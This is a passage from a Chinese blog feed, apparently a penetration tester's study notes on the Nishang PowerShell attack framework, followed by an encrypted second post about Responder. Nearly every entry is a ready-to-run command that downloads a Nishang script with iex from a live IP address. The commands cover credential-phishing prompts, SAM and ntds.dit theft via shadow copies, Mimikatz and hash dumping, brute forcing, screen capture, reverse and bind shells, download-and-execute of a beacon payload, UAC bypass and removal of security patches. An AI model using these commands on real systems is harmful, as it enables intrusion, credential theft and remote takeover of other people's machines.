Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Check-VM.ps1&#x27;)&quot;</span>;Check<span class="hljs-literal">-VM</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175648796.png" alt="image-20240107175648796"></p></li><li><p><strong>Invoke-CredentialsPhish</strong><br>欺骗目标主机用户，让用户输入密码。</p></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Invoke-CredentialsPhish.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Invoke-CredentialsPhish</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175658135.png" alt="image-20240107175658135"><br>输入密码弹框才会消失<br><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175707103.png" alt="image-20240107175707103"></p><ul><li><strong>Copy-VSS</strong><br>这个脚本利用Volume Shadow Copy服务复制sam文件，如果这个脚本运行在了DC机上，ntds.dit和system hive也能被拷贝出来</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Copy-VSS.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">copy-vss</span> <span class="hljs-literal">-DestinationDir</span> c:/  <br>//<span class="hljs-built_in">copy-vss</span>  <span class="hljs-comment">#把文件保存到当前路径下</span><br>//<span class="hljs-built_in">copy-vss</span> <span class="hljs-literal">-DestinationDir</span> c:/   <span class="hljs-comment">#把文件保存在c盘下</span><br></code></pre></td></tr></table></figure><ul><li><strong>FireBuster  FireListener扫描器</strong><br>对内网进行扫描，打开本地监听，然后远程传送数据，把包发给FireListener</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#首先在本地输入以下命令运行FireListener</span><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/FireListener.ps1&#x27;)&quot;</span>;FireListener <span class="hljs-number">130</span><span class="hljs-literal">-150</span><br><span class="hljs-comment">#接着输入如下命令</span><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/FireBuster.ps1&#x27;)&quot;</span>;FireBuster  <span class="hljs-number">192.168</span>.<span class="hljs-number">43.161</span> <span class="hljs-number">130</span><span class="hljs-literal">-150</span> <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175724581.png" alt="image-20240107175724581"></p><ul><li><strong>Invoke Mimikatz</strong></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">nvoke<span class="hljs-literal">-Mimikatz</span>  <span class="hljs-literal">-DumpCerts</span>    <span class="hljs-comment">##Dump出本机的凭证信息</span><br><span class="hljs-built_in">Invoke-Mimikatz</span>  <span class="hljs-literal">-DumpCerts</span>   <span class="hljs-literal">-ComputerName</span> <span class="hljs-selector-tag">@</span>（“computer1”，“computer2”） <span class="hljs-comment">##Dump 出远程的两台计算机的凭证信息</span><br><span class="hljs-built_in">Invoke-Mimikatz</span>  <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;privillage::debug exit&quot;</span> <span class="hljs-literal">-ComputerName</span> <span class="hljs-string">&quot;computer1&quot;</span> <span class="hljs-comment">##在远程的一台机器上运行Mimikatz并执行 &quot;privillage::debug exit&quot;</span><br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Invoke-Mimikatz.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Invoke-Mimikatz</span>  <span class="hljs-literal">-DumpCerts</span>  <br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175814167.png" alt="image-20240107175814167"></p><ul><li><p><strong>Get-PassHashes</strong><br>需administrator权限</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Get-PassHashes.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Get-PassHashes</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175829566.png" alt="image-20240107175829566"></p></li><li><p><strong>Get-PassHints</strong><br>获取用户的密码提示信息，需administrator权限，可根据提示信息生成密码字典提高爆破成功几率</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Get-PassHints.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Get-PassHints</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175843139.png" alt="image-20240107175843139"></p></li><li><p><strong>Invoke-PortScan</strong></p></li></ul><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>StartAddress</td><td>扫描范围开始的地址</td></tr><tr><td>EndAddress</td><td>扫描范围结束的地址</td></tr><tr><td>ScanPort</td><td>进行端口扫描</td></tr><tr><td>Port</td><td>执行端口，有默认端口</td></tr><tr><td>Timout</td><td>超时时间</td></tr><tr><td>ResolveHost</td><td>存活主机并解析主机名</td></tr></tbody></table><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Scan/Invoke-PortScan.ps1&#x27;)&quot;</span>; <span class="hljs-built_in">Invoke-PortScan</span> <span class="hljs-literal">-StartAddress</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">43.1</span> <span class="hljs-literal">-EndAddress</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">43.50</span> <span class="hljs-literal">-ResolveHost</span>  <br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175855893.png" alt="image-20240107175855893"></p><ul><li><strong>Invoke-BruteForce</strong><br>对SQL Server，域控制器(ActiveDirectory)，web以及ftp弱口令爆破</li></ul><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>ComputerName</td><td>对应服务的计算机名</td></tr><tr><td>UserList</td><td>用户名字典</td></tr><tr><td>PasswordList</td><td>密码字典</td></tr><tr><td>Service</td><td>服务  默认为sql服务</td></tr><tr><td>Delay</td><td>延迟时间</td></tr><tr><td>StopOnSucess</td><td>匹配一个后停止</td></tr></tbody></table><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Scan/Invoke-BruteForce.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Invoke-BruteForce</span> <span class="hljs-literal">-ComputerName</span> WEB <span class="hljs-literal">-UserList</span>  C:\tools\<span class="hljs-number">1</span>.txt  <span class="hljs-literal">-PasswordList</span> C:\tools\<span class="hljs-number">1</span>.txt  <span class="hljs-literal">-Service</span> FTP <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure><ul><li><strong>屏幕窃取</strong><br>Show-TargetScreen脚本使用MJPEG传输目标机远程桌面的实时画面。</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Show-TargetScreen</span> <span class="hljs-literal">-Reverse</span> <span class="hljs-literal">-IPAddress</span> <span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">443</span>  <span class="hljs-comment">#Reverse反向连接 Bind  正向连接</span><br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Show-TargetScreen.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Show-TargetScreen</span> <span class="hljs-literal">-Reverse</span> <span class="hljs-literal">-IPAddress</span> <span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">1111</span><br><span class="hljs-comment">#在攻击机上</span><br>nc <span class="hljs-literal">-nlvp</span> <span class="hljs-number">1111</span>| nc <span class="hljs-literal">-nlvp</span> <span class="hljs-number">9999</span>   <span class="hljs-comment">#访问本机9999端口即可</span><br></code></pre></td></tr></table></figure><h2 id="powershell-隐藏通信隧道"><a href="#powershell-隐藏通信隧道" class="headerlink" title="powershell 隐藏通信隧道"></a>powershell 隐藏通信隧道</h2><ul><li>I<strong>nvoke-PowershellTcp</strong></li></ul><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>IPAddress</td><td>选择-Reverse选项时表示需要连接的IP地址</td></tr><tr><td>Port<int32></int32></td><td>选择-Reverse选项时表示需要连接的端口，选择-Bind选项时表示需要监听的端口</td></tr><tr><td>Reverse</td><td>反向连接</td></tr><tr><td>Bind</td><td>正向连接</td></tr></tbody></table><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#反向</span><br>nc <span class="hljs-literal">-lvp</span> <span class="hljs-number">3333</span><br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Invoke-PowerShellTcp</span> <span class="hljs-literal">-Reverse</span> <span class="hljs-literal">-IPAddress</span> <span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">3333</span><br><span class="hljs-comment">#正向</span><br>nc <span class="hljs-literal">-nv</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>  <span class="hljs-number">3333</span><br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Invoke-PowerShellTcp</span>  <span class="hljs-literal">-Bind</span>  <span class="hljs-literal">-Port</span> <span class="hljs-number">3333</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175926709.png" alt="image-20240107175926709"></p><ul><li><strong>Invoke-PowershellUdp</strong></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">正向：nc <span class="hljs-literal">-nvu</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span> <span class="hljs-number">3333</span><br>反向:   nc <span class="hljs-literal">-lup</span> <span class="hljs-number">3333</span><br><br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Shells/Invoke-PowerShellUdp.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Invoke-PowerShellUdp</span> <span class="hljs-literal">-Reverse</span> <span class="hljs-literal">-IPAddress</span> <span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">3333</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175938290.png" alt="image-20240107175938290"></p><ul><li><strong>Invoke-PoshRatHttp和Invoke-PoshRatHttps</strong></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">HTTP：    <span class="hljs-built_in">Invoke-PoshRatHttp</span>  <span class="hljs-literal">-IPAddress</span>  <span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">3333</span><br>HTTPS： <span class="hljs-built_in">Invoke-PoshRatHttps</span>  <span class="hljs-literal">-IPAddress</span> <span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">3333</span><br><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175951060.png" alt="image-20240107175951060"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><ul><li><strong>下载执行</strong><br>Download_Execute是Nishang中下载执行脚本</li></ul><p>ExetoText</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#将exe转成txt</span><br>ExetoText becone.exe  c:\becone.txt<br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Utility/ExetoText.ps1&#x27;)&quot;</span>;ExetoText D:\tool\beacon.exe  D:\becone.txt<br><span class="hljs-comment">#下载并执行</span><br>Download_Execute http://<span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span>/becone.txt<br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Execution/Download_Execute.ps1&#x27;)&quot;</span>;;Download_Execute http://<span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span>/becone.txt<br></code></pre></td></tr></table></figure><ul><li><strong>Bypass UAC</strong></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#使用sysprp方法执行默认的payload</span><br><span class="hljs-built_in">Invoke-PsUACme</span>  <span class="hljs-literal">-Verbose</span>    <br><span class="hljs-comment">#使用oobe方法并执行默认的payload</span><br><span class="hljs-built_in">Invoke-PsUACme</span>  <span class="hljs-literal">-method</span> oobe <span class="hljs-literal">-Verbose</span><br><span class="hljs-comment">#使用-Payload参数可以自行指定执行的payload</span><br><span class="hljs-built_in">Invoke-PsUACme</span>  <span class="hljs-literal">-method</span> oobe <span class="hljs-literal">-Payload</span> <span class="hljs-string">&quot;powershell -windowstyle hidden -e Your EncodedPayload&quot;</span><br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Escalation/Invoke-PsUACme.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Invoke-PsUACme</span>  <span class="hljs-literal">-Verbose</span>    <br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107180006584.png" alt="image-20240107180006584"></p><ul><li><strong>删除补丁</strong></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#移除目标机器上的所有更新补丁</span><br><span class="hljs-built_in">Remove-Update</span> All<br><span class="hljs-comment">#移除目标机器上的所有与安全相关更新</span><br><span class="hljs-built_in">Remove-Update</span> Security<br><span class="hljs-comment">#移除指定编号的更新</span><br><span class="hljs-built_in">Remove-Update</span> KB2761226<br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Escalation/Remove-Update.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Remove-Update</span> KB976902<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107180022062.png" alt="image-20240107180022062"></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>nishang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>responder学习</title>
    <link href="/2022/06/15/responder%E5%AD%A6%E4%B9%A0/responder%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/06/15/responder%E5%AD%A6%E4%B9%A0/responder%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="26b70d3ecf4f8b29a442314291161b5fb25bce8311d8ee7b501583beb8f3ef08">098d9f64412ee3ba7b7422d539a1fc87c834b9a03c2ec0d3fc8966d4c697341f2f0bb072cd806e59eafc6f1db99a098ce31872425fb816d0ba4ab68571ee9e7701b8295f7b25c8b5a725c8226a3aad36c10eefd8f0b6c06cb93bf6e90612c428e352228cd8b89f8ad00f9884e6f66fc12d93802f5984d45db8e6a122cb877fea24b12229851cbe1ceca17c39f5834a5fdd003fd6bbc8e63cf352565a314c802506bf38b5e80a7b7b26d21be4d999c17b5421671c8c66f4c5705d8225bbcae78d9fa58445796613d560266002027c65f9b11ef251331720dbddaa616e1de394ddb236d0ca4d6f0e48eeaf21b87f322945471dc80499731e466accd634bb8b7c445110fd31213cc2bfc94ebcfdff45106044257ef2a14ef7ca6735a255f92d16475d904f8472cef36d5b967a71d963f3cc1d9671b8708c91106d14fd2c73ae0727790b6d0c3803850fc87817123db569ab89aa0201589800f5e0857257962fd9848ac5057d46e73b8331e96cb148338c55de419f4cc20c2f8fed54ea0649fb19a5e78d364fbf03986fd6cc2fdf47de39a8b72db8c872ef5a1384bff651c17a97c29e178c2d0343ff47483ffb470ce6721e114af3cf0c8aa2c690b837758520402c6b92bfd99b32fcfa3f4efd1a7db30e0b1cbcab96440783ac0eced0e726f4464344b0b110dc773093c5e01a721a60eb68769bac35e501a0b651b4e604361d220eb419909356b384d814c9873f6978918dcdbd25a1bdc4ab1a68f484133aa60c96ed88ebe273261da24bcceca8a78f79f9d40e4df1e6fbfb9f2459fb73a07974ff6d700a5459b530fc2c8eb83b368e29c69c8c8c9ae9a38921d680b3a2a587c95f29815d8e188a761336a8bf13238baeeb4276858daf542f586eb8a6ae8dbd0670b6bd8725c4539360d64e60e266a0d128cfd02c7746d69cef611f055cc8ff8fb8a0dd52bfc06ef24d4e8b4e7f29fe46ce4b8656970212b6215a30ded04cd326b178e10f3f8fecf51dbd51d5176d993630a89b2e55d87c4a8bc7cdd657d1e761820e141c02f78fce8b16e9f563a90ace124bb9a23a586be04e9ca082f8bd641b976b4c259a8748954aa76e5dd63578235304ecd373b6aac4ddcfa403fb85505e5abb703f5f1c396979a857d7844a62a79add81747d5f20ea595336b560fba9b9186b25a5144b5766c0bed1f641b0dfe9ae336291747809c29d740ee1e0db919e2f6c12735064e83daf89182d1a0212237513b47bf4c6091a5c35326fdff88ddd3db1d3d4c543cd0e4f5073fb3e0c1ec6d3ebaaed5adae64e6f3944730d07e0294e3e3578108f8bb58101b5b8ea1eea67902ccb7d9079d6779b4d73dfb6fb3c70f0a0eb8d9e733fa90bc01173c66e1a04692f1f208be8283488389fb83b25f532090b87d5a183693f07f98b861ead368a4b58be074d62a978f72edcd7103c9009d2e0b35110a6c6227816ab0fe3e496ff0a7bc9c01c9e7d6367decd14848451031cf734e6cbd5bc6c36c9a24fd9057f8f43fcb6c15873764d8eb2f110835de351d532536c0c9f68b1cdf930c8e40ca5dbd7b2653c2a7677ce6cd05ae23938f2d944836554b6ce787bdabfbfb428a0ad26744c207e67c0f2d334619f100261c0a7e19fdfde33980b55f94f7a892d91795ca27194042e6928bb98143303d47a0660463f456fb1a6e9adb5113a51bcfc933d151393f0a5ec9f9791196cc80fda14550adf8598315c682069d0307b0e13ab8afa14010aca26b12cf73aec291baca0ca52304ed0496fcbe64cf26bf1474fb09c809b34a55ec68ffd93862a32cf0a657eb767a956a6331204b7c8865c8e998a257e6c3861eb29a43bdc6c71e3de82cc813150c233aff9bf62a8fdef909416b6432290a202372b44496bfdb99956fe279c90d84564cf4cfa058fd858bb5c16a9d0f2548fd22a8694840334688856d8cc5e5df2e93cfebb31378b79ef19d66456dfcd16804bbef1259292b1fc27ac2beb03c6bbc25f8aacb6facd99a045dc7c7ec0db3484ae9ba90bc9f5e07d83acbb310e161e784aec471361fa876787ee8515774998db0abcd4cbd29c2a80866645d481294ad5e50022b573829ee31e5a5d94663423814b8791353b1506d6b598648dc0a568011c791fc5453cd9d14e5b37fa72f570fbb5e44646db23fd6b302a30994c0857083840d53c215c6a22fc1e09fe5e57019dc276538f0262d6d2291ce6a157399fe55fca9270be4c3749b1fb26117bbaf1210a3eceaedf1ffdf117219c15a378a4cb048af9d9b4a600100b5a95bba691ba7103219ce7c18374ba06f44ad7bf185fcbb0503979b0028d23cff6fd3763a89c19a846b045303de5d6a78d39d8afcace50725d1ffabefb5fc3cffd0e046241ea32463ad7c940d5e7a9d95b886c2e00995fd01e626013da52e10bb9f56a072d9e38982ef27214f06d26302c913453eb77fe3c1b996881291d9b94f72a9d5c75d8b147172a8b991edc3b76b530e83e8f7e3d653b238039d773fbf6fafbe6843f38ec733aef6147ac1c9383eaceeebe55cfee7e8c1f80b473090dc198aa03611cf7c577d3f68c5e53fdd163ba0a051a663ee34c3f91b6ee7868604d28e1294a271d08f893f65240d6b58a5cf4edc47927efb46cc22edd974f0fd85de2aa5162412cc5b09755daf2336d2bd81311587fe9557fdf44e5ee90841886ff4214c570be50a087f61447a58e548d540384d3f939691724da401166e0bcc5f2acf88dd207c2fda26cbc75e94d5f34f82e537a7e43922ffdecd15f5ce17fb0ca4eff5f766c0ed0f87f3bf4ee8970180a3ceec0da194cc1feda6a4b0047e6be978a37a660a929c364df82b0461b0ef3cca93062320c6738073402427e423044b0c8648d6c5c3e4f03133c901cd10febb6d01413bddb966222a7ae93fcf3aaad8df9f569a1a28c6994575f758984c1c050f71a7c196012ff547873575caaecd81fd87a84fff39f9b8cc7df759456d7a7826f05c0edbdab4bce6ac8c02b6744df443719d56cc71af406db1bc8d59d51d1a6f714ca811291f12c8ab8eaa241e3ab698973fefcf4725381e5e129ce60f927b3ec8c51334779ef4ebf6442db8b43d985edbca7a6879bc3cbba8cffcd78d4c73fac2f58355dff6d97199474630ee484871a259b347d2dcce97743bee476c2b221406485b60d0ab468dc5191d9013d29380e4fac9ca5dd5e6e612dfd88892ef6a74a7e0be2fbfec79f0184e930b54da365065e374507ff76b5e1b1d7b176e5de8f5d5e81bfef854cefa8509165e2fbda572c2155ebf74a2245c178623d521bd3734105b3881ada2fd72c22b47812f6b7bb39689939ac67cbd309545cdd085364141d5c879177458e51afa8acdc719b2476b32a99eb9a05dc26d87375f6d8628cd9aed383baf0110d5ee6f26c6322750cb4114122b5506c402f09cbda6c13bcf3bca9f560a78a743edd9ad40ebf60c8786070725c3790e98c18db993cc1df1a5cef20dd2b99213f2fe73e943ab5d8c018e1312b6538d60bf42a0f378afca7b6f64526cc937445b920588978921fcc062e5c6bcbdcbc4e942a8ae4d45a8edb1d8148a3b96bd177bc01b6f0be4b8fa08d41d353817af7451f0eb09aafcb5cd66042882f79c2a0931f111b8c599dd721253df9da27f6455580e1a0785fc6effa43103a6171e57cdbfae9c4f160449004221912820778c32dd421ddf86961fc20a3275cef89f80d8f00a7a9f214d7d27d90e7564245068f803b11b452acc25954bdb83bb9cd7312081329cfff01f5c193b4c1323a7fb9ad52c4c90b8d8c9095a640b24202a0c18f85d6c434e7760262413590040ec84e7739ad84c167aec1bfa9b5f8a6f2be69378f7348a98cd0be7b7d65728c196bb9fda412625cef7afc432c256325a39706075621973d5adf72b1a053302d5e63f8fca7907eac0818e4741edba18bde5a77461977bba8d75d346354ab5f55531d81e975a3f9183761f08f0fd0e1a4ee2276c7ad091abd1fa8dcd1294812e597260fc5b0b9dade389fe655be2fa45438bf25985e68f540c4083937b080bc8cd3b6a63aa3082c2fa885de1308c292e752efafe08ddd7af3641cbc412f574eb759c1df29589b91a39c8917bade0049619a72ad82d6fd2dd3c37f03a9f1478b49c92855a68a49051d3185bb7a54a199ff6967e5002ea5a53ce7c3fe0dd23dd382357426e32e7b4af8f16729403b4842fed54362b1d53fb8c48171bb896286b0bbdfea44e50e8242d7e0e09bd86f2ed96084aabd61e87795bd9fe1e8848ff5f442a5f9d6da7a751750cac491b1f9339d4d9c5e1c2c7c1a1753ab6b6da3c1b865ca94d3a5616e0b74f4b0fdfa7295f57ca1379dd75e487e96512ee4a59f8453c4239c386229f12cdbd77937149f1b2d5a38214a5f1eb0b3fd49896038408cfe2bb68f5689f76b908501d28934db9db9f40964d7cf243324ef81e9fb7ec8d4e52174ec0c2ca5c1b8087839556274de511ed19454a4d9ff84af6d707a6c260a4c6fbb346bfce130fe52229b7587fc2b096b5d0d8f36694f6136b08af680844d97c64518d0d5620fc4344bea87c2cd021b988ec14136401517158f929dcc5d534c09c9e218a62b61543b60819c311f622643feca9e42dff71d999aed7b70b2489d227729a5af03eb961dfceb7f55981204f92fddb4a0ee29661e2659da46b50cd98fca64dcef26049ca27c6c6cc915e3f28ed31e17118dee0548ceb9bdd4a45d96ea8bbcad97668d4bc8c2069bd74889d396a947878fcac537d00a647371daa0e746b29115245c1362434029add72979df16212bf70b7bd707251dae9716e9a213fe76ca99e8da4018b9a644aaecd07293b158225c2179ca32ec9afeb552ded2e212820a7227ccc4bc6e0ac4bf6d80f9d2ccede9a1350606f39a35b0dc0dadadb0a1e939004cebdfc81b28eed0300f7f49b2633c965115e0ed0e5d55266f3eaaa01d4643d55725bfa351e881780270ec9507c585b5441f567983cbe1b8f043412ce9f22d3475b623b1c69fbaf60b834a6c6976ade5c3ea4c04dce6ce33d375c4d86470939951c753b67d62929196c1b8519175f1fae0fc65798eb90d66109a94717b65d7dc20639e8a5ba0699b78b87607b31f3b214cf3a311aec72991d98dda5aed118a3a95015166d19cdff2e2df9171f062955bb0d5f895e98a02a1197fb13a02add1f3fc226b8501adc692c0b6989e4845f8598f73a19c081c08076ad21b175187d2c16990bff8329317f6a337dff8aae245d637313b6dc6a198569b21f5205346f8f0b3e1b82de1f559af98b971499b76e599fe8f14adb70f54d04176ea6350afcac94c1ecb84adc56a1202a83c232b35eb19fbe5a719975b92c4a58c9d30fbb0492381b028f02c7bc74d80d2060495c067c7f5e8f5f62ed5624e454748b18ede2030ac894b1759e4ef13ab5a95385d36d85466165c2ffb277caff608b53243d4857619d78e72fe2f726b036bb510ad6479262b99b